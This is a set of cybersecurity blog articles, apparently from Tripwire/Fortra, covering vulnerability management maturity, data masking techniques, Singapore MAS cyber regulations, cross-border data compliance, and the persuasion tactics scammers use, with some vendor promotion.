incentivize this process, the C-Suite can choose to award the asset owners with the lowest scores.\n2. Patching with priorities\n| Empirical vulnerability data to outline which vulnerabilities should be remediated along with instructions on how to conduct the remediation allow the system owners to prioritize their efforts with a focus on the vulnerabilities that will reduce the overall organizational risk.\n3. Tracking progress\n| As new vulnerability scans are run, metrics, such as the ones offered by CIS, can be used to show trending analysis of the risk and remediation progress. The key is to show progress month by month, quarter by quarter, and year by year. The vulnerability risk scores and time to remediation should decrease as teams become more familiar with the process and become more educated on the risks that the attackers pose.\nHow Fortra VM Helps\nFor those with only vulnerability scans in place, getting to the next level can seem like a daunting task. There are multiple steps, guidelines, and policies involved, and to an overwhelmed SOC, that can look like time, cycles, and staff they don’t have. Those resources are needed somewhere else (like vetting for alerts), so the prospect of a mature vulnerability management program falls by the wayside. It is categorized in the “nice but not necessary” security wish list.\nThe Value of a Mature Vulnerability Management Program\nIt is important to keep in mind that a mature vulnerability management program\npays for itself\n– both in time and money. It vets alerts for you, giving your practitioners back a huge portion of their day. It helps discover threats you may otherwise have to find on your own. And it puts the whole process on autopilot so that you don’t have to reinvent the wheel every few months. Vulnerability management programs help organizations get ahead, stay ahead, and not waste time patching things of small importance while things of large importance go unnoticed.\nFortra’s Vulnerability Management Capabilities\nFortra facilitates a smart, mature vulnerability management program in the following ways:\n1. Scanning\n| Combining proprietary technology, authenticated scanning techniques (logging in with credentials), and both internal and external threat intelligence, Fortra probes the following looking for vulnerabilities:\nSoftware versions\nSystem configurations\nMissing patches\nFor a more in-depth approach, Fortra’s vulnerability management solution can also deploy agents to dive deeper into the security posture of specific systems. Check out this video on Fortra VM’s\nscanning tool\n.\n2. Asset Discovery\n| With Network Map, teams get a full visual of their network and its security posture. Create custom reports and scan, label, and group assets to determine their overall risk. Plus, classification tools like\nFotra’s Data Classification Suite (DCS)\ncan help assets not only be recognized but prioritized by severity.\n3. Detection\n| Fortra leverages CVE scores and real-world exploitation vectors to determine the criticality of a found vulnerability. Additionally, it can integrate with penetration testing tools like\nCore Impact\nto bring an extra layer of attack power when vetting for exploitability.\n4. Remediation\n| After determining priority with the above tools, Fortra can leverage theAPI to integrate processed vulnerabilities into existing workflows so nothing gets missed. Using Peer Insight, Fortra lets teams know how their risks compare with other companies their size, and Security GPA can help track remediation efforts over time.\n5. Dashboard and Reporting\n| Building on these remediation capabilities, Fortra VM’s intuitive Active View dashboard provides a clear, real-time view of vulnerabilities and their remediation status. Customizable reports help teams generate asset-specific insights, measure progress effectively, and track the key metrics that matter most to the business.\nTo learn more about how to build a\nmature vulnerability management\nprogram with Fortra, check out this\nwhite paper\n.\nMastering Security Configuration Management\nMaster Security Configuration Management with Tripwire's guide on best practices.

        "content": "Image\nProtecting individual privacy is paramount, given the proliferation of Personally Identifiable Information (PII) and other sensitive data collected by enterprises across all industries. One way to protect sensitive data is through PII masking e.g., consistently changing names or including only the last four digits of a credit card or Social Security Number.\nWhat is data masking?\nData masking replaces sensitive columns in the source data with realistic test data. A data breach remediation strategy is primarily used to address areas of risk. By preserving the integrity and usability of the original, it creates an unidentifiable and secure version.\nMasking is usually needed for the following types of data:\nPersonally Identifiable Information (PII) such as names, email addresses, social security, and telephone numbers\nProtected Health Information (PHI) such as patient name, insurance details, diagnostic information, and medical history.\nThe Payment Card Industry (PCI) is concerned with protecting consumers' financial information by the\nFederal Trade Commission (FTC)\n.\nData masking is often used in non-production environments, such as software development, data science, testing, and training. Tools and processes mask sensitive data to make it unrecognizable while maintaining its functionality for authorized users.\nData Masking Process\nIterative data masking consists of five steps: data discovery, defining masking rules, assigning masking rules, deploying masking functionality, and auditing the entire process.\nImage\nThe data masking process starts with:\nDiscover the data and its relationships: Your data masking tools or process should import the metadata data and be able to discover, analyze, and visualize the sensitive data within the data sources.\nDefine the data masking rules: Based on the masking requirements, you should be able to define dynamic masking rules (restricting access to sensitive data with\nRole-Based Access Controls (RBAC)\n) and persistent data masking rules and, then develop different masking regulations for various types of users and data types.\nAssigning the appropriate masking rules: Your tools should be able to assign the masking rules on columns or data elements.\nDeploying the masking functions: Your tools/process should have a wide range of built-in functions, such as substitution, randomization, shuffling, and nulling out, but it should also allow you to deploy customized functionality.\nAudit reports for compliance: Your tool should be capable of generating exportable audit reports. The reports should contain the data system name, schema, table, column name, type, field, and masking rule used. This is an ongoing process.\nData masking versus encryption and tokenization\nData anonymization is the process that transforms PII data into another form to secure and protect it. The three most common data anonymization methods are data masking, encryption, and tokenization. Data masking is irreversible, while encryption and tokenization are reversible because the original values can be derived from the obscured data. Below is a brief explanation of the three methods:\nData masking\nHiding Sensitive data in nonproduction environments to protect the data from data breaches with the industry standard masking rules. Compliance and privacy regulations (\nPCI DSS\n,\nHIPAA\n,\nGDPR\n, and\nCPRA\n) mandate masking data before it is copied to a non-production environment. The algorithm used to mask the PII data must be irreversible.\nData Encryption\nEncryption scrambles data using mathematical models. Without the correct decryption key, the data is unreadable. Encryption prevents interception, theft, and misuse. Common encryption algorithms include the Advanced Encryption Standard with 128-bit encoding (AES), and Elliptic Curve Cryptography (ECC).\nData Tokenization\nTokenization is when a unique identifier replaces sensitive data within a record to make it more secure. It is primarily used in Master Data Management (MDM) to facilitate matching records by generating match tokens, representing the key data points of a record for comparison while keeping the original sensitive data secure. Tokenization anonymizes data for matching purposes without exposing sensitive information.\nComparatively, tokenization allows credit card payments to be processed without revealing the card number. The data never leaves the organization and can’t be seen or decrypted by a third-party processor. Data masking is irreversible, making it more secure and less costly than tokenization. Data masking software ensures referential integrity and context across systems and databases, which is crucial for testing and data analysis. In the case of anonymized data, integrity means that the dataset maintains its validity and consistency despite being de-identified. Masked data is usable in its anonymized form, but its original value can never be recovered once it is masked.\nWhy data masking?\nEnterprises need data masking solutions because they enable them to:\nReduce the risk of data exposure, which is required for compliance with privacy laws, such as CPRA, GDPR, and HIPAA.\nProtect data in lower (DEV, QA, UAT, Training) environments from cyber-attacks while maintaining consistency and usability.\nIntegrate with third-party apps or migrate more securely to the cloud while reducing the risk of improper data sharing.\nThere has never been a time when data masking tools have been as vital as they are today in protecting sensitive data and addressing the following challenges:\nImage\nCompliance with regulatory requirements\nCompliance and privacy regulations recommend data protection methodologies.\nInsider threats\nEmployees and third parties regularly access enterprise systems to test software or analyze data. Sensitive information is often shared in development, testing, and non-production environments. Because of this, production systems are particularly vulnerable to data breaches. Ponemon Institute reports that insider threats have increased 47% since 2018, and protecting sensitive data costs companies an average of $200,000.\nExternal threats\nAccording to Verizon's\nreport\n, personal data was compromised in 58% of data breaches in 2020. The study found that 72% of the victims were large enterprises. Given the large, varied, and fast nature of enterprise data, it is no wonder breaches proliferate. Protecting sensitive data in non-production environments can reduce the risk of leakage. This is one example of data masking.\nData governance\nRole-Based Access Control (RBAC) should secure your data masking tool. The comparison of persistent or dynamic data masking shows that persistent data masking obscures a single dataset, while dynamic data masking provides granular control. Dynamic data masking allows permission to be granted or denied at various levels. Those with appropriate access rights can access the actual data, while those who are not allowed to see certain parts will be unable to see them. Masking policies can also be applied differently to different users.\nFlexibility\nData masking is highly customizable. Data teams can choose which data fields get masked and how to select and format each substitute value. For example, every Social Security Number (SSN) has the format xx, where “x” is a number from 0 to 9. They can substitute the first five digits with the letter x or all nine numbers with other random numbers according to their needs.\nTypes of data masking\nAs data masking evolved, it became more sophisticated, flexible, and secure, including:\nPersistent data masking\nNon-production environments like those used for analytics, testing, training, and development often source data from production systems. In such cases, sensitive data is protected with static data masking; a one-way transformation that ensures the masking process cannot be undone. Repeatability is a key concept in testing and analytics because using the same input data delivers the same results. This requires the masked data values to persist over time and through multiple extractions. For software testing, static data masking is usually employed on a copy of a production database. Advanced masking tools make data look authentic, enabling software development and testing without exposing the original values.\nDynamic data masking\nDynamic data masking protects, obscures, or blocks access to sensitive data. While prevalent in production systems, it is also used when testers or data scientists require accurate data. Dynamic data masking is performed in real-time in response to a data request. Masking consistency is difficult when the data is stored in multiple systems, especially in environments that use various technologies. Dynamic data masking protects sensitive data on demand.\nDynamic data masking automatically streams data from a production environment to avoid storing the masked data in a separate database. It’s generally used for role-based security in applications, such as managing customer queries and processing sensitive health information records, and in read-only scenarios so the masked data doesn’t return to the production system after the check has been run.\nData masking techniques\nIn terms of data masking techniques, there are several core techniques associated with data obfuscation, as shown in the following table:\nTechnique\nHow it works\nNotes\nData anonymization\nRemove or modify PII data\nThe goal is to make the data permanently anonymous and untraceable to specific people.\nPseudonymization\nData is swapped with random values while the original data is securely stored.\nThis applies to unstructured as well as structured data.\nSubstitution\nData from a dictionary is substituted for similar but unrelated data in a column of data using substitution masking.\nPrevents data breaches by dummy data in the table.\nRandom\nAn entirely or partially generic value can be replaced with PII in a field.\nValid when PII isn’t required or when dynamic data masking is employed.\nShuffling\nShuffle masking swaps the data in a column with data from the same column in another row of the table.\nScrambles the actual data in a dataset across multiple records.\nDate aging\nBy applying random data transformations, confidential dates can be concealed.\nRequires assurance that the new random dates are consistent with the rest of the data\nKey Masking\nKey masking produces deterministic results for the same source data, masking rules, and seed value.\nData will be masked with deterministic results.\nNulling out\nTo protect PII, a null value should be applied to a data column.\nA security feature that prevents unauthorized viewing.\nImage\n6 Challenges of Masking Data\nAltered data must retain the essential characteristics of the originals while undergoing sufficient transformation to eliminate the risk of exposure as long as referential integrity is maintained.\nMany production systems are deployed on-premises and in the cloud across various technologies in enterprise IT landscapes. To mask data effectively, here’s a checklist of must-haves:\nPreserving formats\nData masking tools must understand your data and what it represents. The original format should be preserved when accurate data is replaced with fake data. For data threads involving dates, for example. A specific order is essential.\nReferential integrity\nPrimary keys connect relational database tables. When your mask solution hides or substitutes a table's primary key, the values must be consistently changed across all databases. Thus, Sam Jones, for instance, must have a consistent identity wherever he is masked as Rick Smith.\nPII discovery\nAlthough PII is scattered across many different databases, the correct data masking tool should be able to discover where it’s hiding.\nData governance\nData access policies must be established and adhered to based on role, location, or permissions.\nScalability\nData access and extraction must be enabled in real time for structured and unstructured data.\nIntegration\nRelational databases, NoSQL databases, legacy systems, message queues, flat files, and XML documents must all be considered data sources, technologies, and vendors.\nSummary and recommendations\nData masking has become essential to enterprise efforts to comply with privacy protection regulations and address emerging generative AI data outputs.\nToday, the sheer volume of structured and unstructured data, the challenging regulatory environment, and the demand for lifelike masked data require highly sophisticated data masking tools.\nThe wide variety of data sources (mainframe, ERP, Streaming systems and noSQL databases) makes automated PII discovery and masking even more complex, especially since every vendor touts its own data masking tools.\nAbout the Author:\nImage\nArfi Siddik Mollashaik is a Solution Architect at Securiti.ai, USA a leading enterprise data security, privacy, and compliance firm.

        "content": "Image\nThe Monetary Authority of Singapore (MAS) is both the central bank and chief financial regulator of Singapore. As such, they publish best practices (“Guidelines”) and legally binding regulations (“Notices”) regarding technology risk management and cyber hygiene. Mandatory requirements include:\nNotice on Technology Risk Management (FSM N21)\nNotice on Cyber Hygiene (FSM N22)\nNotice on Management of Outsourced Relevant Services for Banks (MAS Notice 658)\nand Merchant Banks (MAS Notice 1121)\nThe\nMAS Technology and Risk Management (TRM) Guidelines\noffer best practice standards that provide financial institutions with insight into how to implement the compliance obligations set out in the above Notices. Additionally, in September 2024, MAS established the Cyber and Technology Resilience Experts (CTREX) Panel to bolster technology and cybersecurity best practices, with the aim of improving the operational resilience of Singapore’s financial sector.\nWho Must Comply with MAS Cybersecurity and Risk Management Notices?\nWho Must Comply with MAS Notices\nThe Monetary Authority of Singapore’s Notice on Technology Risk Management (MAS TRM) and Notice on Cyber Hygiene are legally binding and apply to all financial institutions operating in Singapore, including:\nBanks\nInsurance companies\nFintech firms\nPayment service providers\nVenture capital managers\nAnd more, comprising all financial institutions regulated by MAS.\nPenalties for Not Complying with MAS Notices\nWith the passing of the\nFinancial Services and Markets (FSM) Bill\nin 2022, MAS was given\nconsolidated authority\nover Singaporean financial institutions, which included applying penalties for non-compliance with relevant Regulations and Notices. Under the FSM Bill, the maximum penalty for data breaches under these laws is $1 million dollars, and more if a data breach reveals multiple compliance infractions.\nThe MAS Notice on Technology Risk Management (TRM)\nThe MAS\nNotice on Technology Risk Management (TRM)\nwent into effect on May 10, 2024. It outlines several key requirements for financial entities in Singapore:\nImplement a framework and process to identify critical systems.\nMake all reasonable efforts to maintain high availability for critical systems.\nEstablish a recovery time objective (RTO) of no more than 4 hours for each critical system.\nNotify the Authority\nno more than one hour\nafter discovering a relevant incident.\nSubmit a root cause and analysis report to the Authority no more than 14 days from the incident’s discovery.\nImplement IT controls to protect customer information against unauthorized access or disclosure.\nPer the Monetary Authority of Singapore’s website, the Notice on Technology Risk Management (TRM) “sets out requirements for a high level of reliability, availability and recoverability of critical IT systems and to implement IT controls to protect customer information from unauthorised access or disclosure.”\nNote:\nMAS released its\nTechnology Risk Management (TRM) Guidelines\nin January 2021. These\nguidelines\narm financial institutions in Singapore with the principles and best practices they need to create a robust technology risk management program with proper governance and oversight. While these are helpful for implementing the cybersecurity requirements and risk management requirements (“Notices”) outlined by MAS, the Guidelines are not of themselves mandatory.\nThe MAS Notice on Cyber Hygiene\nAlso effective May 10, 2024, the MAS\nNotice on Cyber Hygiene\n“sets out cyber security requirements on securing administrative accounts, applying security patching, establishing baseline security standards, deploying network security devices, implementing anti-malware measures and strengthening user authentication,” according to the\nMAS website\n.\nUnder the Notice on Cyber Hygiene, financial institutions operating within Singapore are required to implement the following cyber hygiene practices:\nSecure every administrative account to prevent unauthorized access. This includes relevant operating systems, databases, applications, security appliances, and network devices.\nApply patches to vulnerabilities in every system. Patches must be applied in time to negate the risks posed.\nCreate a written set of cybersecurity standards for every system and require compliance. Where compliance is not possible, compensating security requirements must be put in place to mitigate the resulting risk.\nImplement network perimeter controls to restrict unauthorized traffic.\nImplement one or two malware protection measures on every system.\nImplement MFA on all administrative accounts (operating systems, databases, applications, security appliances, and network devices) and on any accounts used by the administrator to access customer information via the Internet.\nThe MAS Notices on Management of Outsourced Services for Banks\nThird-party risk is one of the most recent issues addressed formally by the Monetary Authority of Singapore. On December 11, 2024, two additional Notices went into effect:\nMAS\nNotice 658 Management of Outsourced Relevant Services for Banks\nMAS Notice 658\noutlines mandatory requirements for banks regarding third-party risk management, including that they “assess, manage and monitor any risk to the bank that may arise from obtaining or receiving each of these relevant services.”\nMAS\nNotice 1121 Management of Outsourced Relevant Services for Merchant Banks\nMAS Notice 1121\nrequires the same – that financial institutions assess, manage, and monitor any third-party risk to the bank – but from merchant banks.\nThe MAS Advisory on Addressing the Cybersecurity Risks Associated with Quantum\nOn Feb 202, 2024, MAS published an\nadvisory addressing the risk of quantum computing\non the financial sector in Singapore. The\nadvisory\ncited the potential of cryptographically relevant quantum computers (CRQCs) to “break some of the commonly used encryption and digital signature algorithms” and called for financial entities to, among other things:\nMonitor ongoing quantum computing developments.\nEnsure that senior management and third-party vendors are made aware of the risks.\nWork closely with third-party vendors to assess IT supply chain risks arising from quantum threats.\nParticipate in information-sharing groups for collective mitigation.\nHow Tripwire Can Help with MAS Cybersecurity Compliance\nFortra’s Tripwire\nIT compliance solutions and strategies\ncan help financial institutions meet cybersecurity mandates, mitigate technology and third-party risks, and harden their systems against cybersecurity risks now and in the future.

        "content": "Image\nIt is a significant benefit that the world is connected the way it is, with the potential for even greater interconnectivity. However, this has come at huge costs, too, considering the rise in the direct involvement of state actors engaged in cyber warfare. Against this background, nations have a more acute awareness of digital vulnerabilities, which has radiated into regulatory frameworks concerning cross-border data compliance. Beyond security, privacy, freedom of information, and other legal and ethical factors are also important considerations.\nHow National Security Concerns Have Shaped Data Governance\nNational security concerns have fundamentally altered the way governments and businesses approach data compliance, forcing a shift from an almost exclusive focus on individual privacy rights to a more complex balancing act with national security imperatives.\nExpansion of Government Access\n: In the wake of the 9/11 attacks, US national security priorities inspired legislation such as the Patriot Act. The Act dramatically expanded law enforcement’s authority to access data held by private companies. One can trace the line from such actions to recent US actions to\nrestrict cross-border transfers of bulk sensitive data\nto adversary nations like China, Russia, and Iran.\nData Localization\n: Beyond the US, several countries have been driven to adopt data localization policies; governments are tightening their hold on data generated within their national borders. For instance, China’s Personal Information Protection Law requires data generated on their soil to be stored domestically. Similarly, the provisions of the EU’s GDPR have extraterritorial applications.\nNational Security Exemptions\n: Frameworks like the GDPR were originally designed to protect personal privacy but eventually included broad exemptions for national security purposes. Expectedly, these exemptions also vary by country. This has caused businesses to design processes that account for potential governmental access under security exemptions. This creates an atmosphere of legal uncertainty.\nInternational Regulatory Negotiations\n: Amidst divergent national approaches, countries are increasingly engaging in bilateral and multilateral negotiations to reconcile their differences and facilitate legal data flows without compromising security. A notable example is the\n2024 initiative between the European Union and China\n, which launched discussions under a new mechanism aimed at streamlining industrial data flows.\nRegulation of Emerging Technologies\n: National security concerns have spilled over into the regulation of emerging technologies such as artificial intelligence, blockchain, and connected vehicles. For instance, the\nEU AI Act\n, which went into effect last year is expected to make an impact on cross-border data flows.\nGlobal Regulatory Landscape for Cross-Border Data Flows\nThe EU GDPR remains a cornerstone framework for understanding the global landscape of cross-border data-sharing regulation. Since GDPR emphasizes user consent and data minimization, organizations must inform users about the potential sharing of their data and the possible purposes for which it should be used.\nCritically, GDPR’s reach extends beyond the EU’s borders and applies to organizations operating within Europe that share data with entities outside the EU. Such transfers require a legitimate ground, such as an international agreement. The EU Data Protection Board (EUDP) recently provided\nfurther guidance on GDPR Article 48\n, which addresses data transfers to non-EU entities.\nIn contrast to the comprehensive nature of the GDPR, the United States still lacks a general federal data protection law, and efforts toward creating one have stalled. However, a major state law from the US is the California Consumer Privacy Act (CCPA) alongside the California Privacy Rights Act (CPRA).\nAs state laws, the CCPA and CPRA can’t directly regulate international data transfers in the same way as GDPR. However, they impose obligations on companies holding personal data and even, to some extent, require conformity with GDPR provisions.\nMoving across the globe, the Asia-Pacific region and Latin America are developing regulatory frameworks in this domain. In Africa, the\nAfrican Union Data Policy Framework\nis an effort in this regard, but national policies often prioritize domestic interests, which sometimes conflict with broader continental goals. The tension arises from differences in political ideologies and socio-economic conditions, among others, across African nations.\nZeroing in on the Challenge of Data Sovereignty\nData sovereignty\ncan be considered a classic example of a seemingly necessary legal safeguard that ends up harming the digital ecosystem it was designed to protect. On the one hand, governments do indeed need to\nshield their citizens’ data, enforcing domestic laws\non data collection, storage, and processing is a matter of national security. On the other hand, this same approach fragments the digital landscape of cross-border innovation. It is somewhat of a paradox that while technology has enabled us to live increasingly globalized lives, innovative progress may soon be threatened by the way nations approach compliance.\nAs of 2023, about 40 countries had effected nearly 100 data localization policies, of which more than 50 were implemented within the previous decade. For businesses, this is not the most profitable approach since it increases data management\nbetween 15% and 55%\n.\nTo be clear, every nation has the right to set its laws, but often, data sovereignty goes beyond citizens’ privacy and national security. It has extended into a tool to assert geopolitical influence and stifle competition between countries. Arguably, not every move toward data sovereignty is well-intentioned.\nAs such, it is time for policymakers to stop viewing data sovereignty as a one-size-fits-all solution. There needs to be a more nuanced approach that involves international frameworks and digital trade agreements, like the\nEU-Singapore deal\n, which seeks to harmonize rules and reduce fragmentation.\nConclusion\nThe path to effective cross-border data compliance is not straightforward. What’s certain is that it requires a lot of collaboration between various stakeholders: nations and governments, policymakers, the private sector, and the masses.\nAbout the Author:\nImage\nMichael Usiagwu is an Entrepreneur, Tech Pr Expert and CEO of\nVisible Links Pro\n.

        "content": "Scammers are highly resourceful and cunning when devising new ways to swindle people. But they often rely on long-standing persuasion techniques for their tricks to work. So, you may hear about a new scam that uses a novel narrative, but there is a good chance that the scam depends on proven scam techniques once the narrative is stripped away.\nBut first, what constitutes a scam? A scam is when someone deceptively attempts to get money, data, or personal information from you under false pretenses. They do so with methods including\nsocial engineering\n, emails (phishing) and text messages (smishing), often posing as legitimate companies, governmental agencies, or even real people from your life in order to create a false sense of trust.\nTo Err is Human\nThese scam techniques often exploit our characteristics and heuristics, the very things that make us human and fallible. A malefactor may use a variety of techniques to pressure people into acting against their own best interests, but each of these techniques will use emotion to cloud the target's judgement.\nIn this blog post, we will cover some of the following common scam techniques and explain how they work:\nEvoking visceral influence\nCreating urgency\nExploiting the fear of missing out (FOMO)\nAppealing to authority\nFaking social proof\nAppealing to reciprocity\nLeveraging the bandwagon effect\nAppealing to emotions of guilt or sympathy\nNormalizing risky behavior\nExploiting trust in experts\nThe Stick and Carrot\nEvoking visceral influences such as hunger, thirst, pain, fear, excitement, sexual desire, greed, and suchlike, are primal states that can powerfully guide behavior. People often focus entirely on addressing the immediate need when under such influence, compromising rational thinking. For example, we’re told not to shop for food when hungry because our judgment is clouded.\nScammers exploit this by triggering visceral states, such as fear (a compromised account) or excitement or greed (a free prize). The goal is to provoke an impulsive reaction without logical thought, often overriding caution and advice.\nWhat to watch for: How does the email make you feel? Are you stressed, excited, or anxious?\nAct Fast! Before Common Sense Kicks In\nVisceral influences are fleeting, which is why scammers combine them with urgency cues. This often involves deadlines like \"You have 24 hours to recover your account,\" or \"Only the first 100 people can claim this offer,\" or more subtle tactics (such as subscription renewal pressure).\nUrgency pushes quick action, exploiting the compromised thinking under visceral influence and often paired with scarcity to further pressure decisions.\nWhat to watch for: Any message stressing time limits or a need to act quickly.\nThe FOMO is Real\nWhen something is scarce, we tend to value it more and want it even more. Suggesting scarcity is a common persuasion tactic used by scammers to encourage impulsive action, as seen in “one-day offers” or similar limited-time deals. This taps into the fear of missing out (FOMO), leading us to make hasty decisions.\nWhat to watch for: Watch for messages that pressure you to act “before it’s too late,” with countdowns or claims like “Only a few spots left” or “Offer ends today!” These are tactics designed to rush your decision.\nFake It 'Til They Make You Panic\nScammers often impersonate figures of authority such as police, doctors, lawyers, or government officials (the IRS, FBI). We are conditioned from a young age to trust and comply with authority figures, often without questioning their motives. This makes it easier for scammers to lower our defenses, particularly when threats of penalties or legal consequences are involved.\nWhat to watch for: Pressure to comply with authority figures, especially with threats of legal consequences or penalties.\nTrust Me, I’m a Customer\nWe naturally look to others to guide our decisions, and scammers exploit this by faking social proof or reviews, testimonials, and social media accounts. This lowers our skepticism and encourages us to trust their offers. They may also use fake testimonials or\nphishing emails\nthat appear to come from someone who benefited from a product or service.\nScammers also target groups with common ties, using a trusted individual to influence others within the group, often seen in pyramid schemes.\nWhat to watch for: Suspiciously perfect or overly positive reviews or recommendations from people in your trusted circle.\nThe Masters of 'You Owe Me'\nPeople tend to feel obligated to return favors, especially when something is given to them first. Bad actors often use this by offering something \"free\" or a small gift upfront, making the target feel compelled to reciprocate by clicking on a link, giving out personal information, or making a payment.\nWhat to watch for: If you receive an unsolicited gift or offer, be cautious. Fraudsters may use this as a way to manipulate you into taking action, such as clicking on a suspicious link or providing personal information in return.\nJumping on the Bandwagon\nLeveraging the bandwagon effect is similar to faking social proof but specifically focuses on the idea that if \"everyone else is doing it,\" it must be the right choice. Scammers use this by implying that many people are already taking advantage of an offer or using a product, creating a sense of peer pressure to join in.\nWhat to watch for: Look out for phrases like “Join thousands of satisfied customers” or “Don’t miss out like everyone else.” Be skeptical if a product or offer seems to have an artificially inflated popularity.\nTugging at Your Heart... And Your Wallet\nCybercrooks sometimes exploit feelings of guilt or sympathy by framing their request in a way that tugs at heartstrings. For example, posing as someone in dire need (a relative in an emergency situation) may prompt people to act out of emotional obligation.\nWhat to watch for: Be wary of unsolicited messages that invoke emotional responses, such as urgent pleas for money or help, especially if they claim someone close to you is in trouble or in need. Always verify these pleas before acting.\nA 'Great Deal' Anchored in Deception\nThis cognitive bias occurs when people depend too much on the first piece of information they come across (the \"anchor\") when making decisions. Scammers may set an initial high \"anchor price\" for a product or service, and when they offer a “discount” on the price, the target feels they’re getting a good deal, even though the real value may be much lower than the discounted price.\nWhat to watch for: If you see a product or service being offered at a \"discount,\" check the original price elsewhere. Scammers will often manipulate the initial price to create the illusion of a great deal. Always compare prices across different trusted sites or stores.\nNothing to See Here… Except Red Flags\nSome scammers try to make illegal or risky actions seem normal or acceptable. They might present an unethical decision (such as investment in a high-risk opportunity) as a common or sensible move, decreasing the resistance of the target.\nWhat to watch for: If someone encourages you to take shortcuts, bypass legal or financial protocols, or act against your better judgment, take a step back. They may be trying to normalize behavior that’s actually a scam or fraud.\nCertified in B.S.\nSimilar to appealing to authority, this focuses on presenting the scammer as an \"expert\" in a specific field. The scammer may drop terms or present data that seems highly credible or scientific, tricking the victim into trusting their advice or offer.\nWhat to watch for: If someone uses complex jargon, official-sounding titles, or authoritative references that you don’t fully understand, verify their credentials before trusting their advice or offer. Experts should be transparent and open to questions.\nTools Used by Scammers\nAs we've discussed above, some of the most common tools scammers use are phishing emails and fake social accounts. Let's take a look at a few of the other tools scammers use and why:\nFake IDs and credentials\n: Unfortunately, it’s easy for malefactors to get their hands on fake IDs, including basic photo IDs as well as governmental and corporate ID badges. Scammers also use other fake credentials like badge numbers, job titles, and stolen personal data to gain trust.\nCall spoofing:\nCriminals have the ability to make fraudulent phone calls appear as if they're coming from legitimate sources like banks or the IRS. Don’t give away credit card info over the phone unless you made the call, and only use companies' official phone numbers listed online or in mail pieces.\nSmishing\n: Smishing is similar to phishing but takes place over short message service (SMS) text messages. One of the most common smishing schemes is when scammers pose as the postal service, claiming the recipient must click a link in order to receive a mail package.\nInternet pop-ups:\nPop-ups interrupt your attention, making them highly successful at creating urgency. Pop-up scams include fake security alerts or online shopping coupons that entice the user to quickly click a button or enter personal details before thinking the situation through.\nFake websites:\nFake websites can look deceptively legitimate and are usually based on well-known brands. Before you enter your credit card number or personal details into a field, make sure the website is secure. You can do so by looking for \"https\" in the URL.\nAI technology for generating realistic content:\nScammers now use advanced AI to create realistic emails, messages, and even entire websites that mimic legitimate sources with high precision. This makes it harder for individuals to distinguish between real and fake communications.\nDeepfake videos:\nCriminals use\ndeepfake technology\nto create highly realistic videos of individuals, sometimes impersonating well-known figures or even acquaintances, in order to fool people into believing they are being contacted by a trusted source.\nCloned voices:\nWith the advancement of voice cloning technology, scammers can now mimic the voices of loved ones, bosses, or colleagues. This is particularly dangerous in phone scams, where a cloned voice may convince the target to provide sensitive information or money.\nMalicious apps:\nSome scammers\ndistribute fake apps\nthat look like legitimate ones but are designed to steal personal information, track users' activities, or even infect devices with malware. It's critical to only download apps from trusted sources such as official app stores.\nSIM swapping:\nThis technique involves fraudsters taking control of someone’s phone number by persuading a mobile carrier to switch the number to a new SIM card. With access to the target’s phone number, scammers can bypass security features like two-factor authentication to access sensitive accounts.\nQR code scams:\nScammers place QR codes\non physical or digital ads, which, when scanned, lead to malicious websites or trigger unwanted downloads. These links can steal personal data or install malware on devices.\nThese tools have grown more and more sophisticated, using every modern technology in the criminal’s arsenal, and making it even more important for people and businesses to\nstay vigilant\nand cautious in their online activities.\nEditor’s Note: The opinions expressed in this guest author article are solely those of the contributor and do not necessarily reflect those of Tripwire.\nMeet Fortra™ Your Cybersecurity Ally™\nFortra is creating a simpler, stronger, and more straightforward future for cybersecurity by offering a portfolio of integrated and scalable solutions.
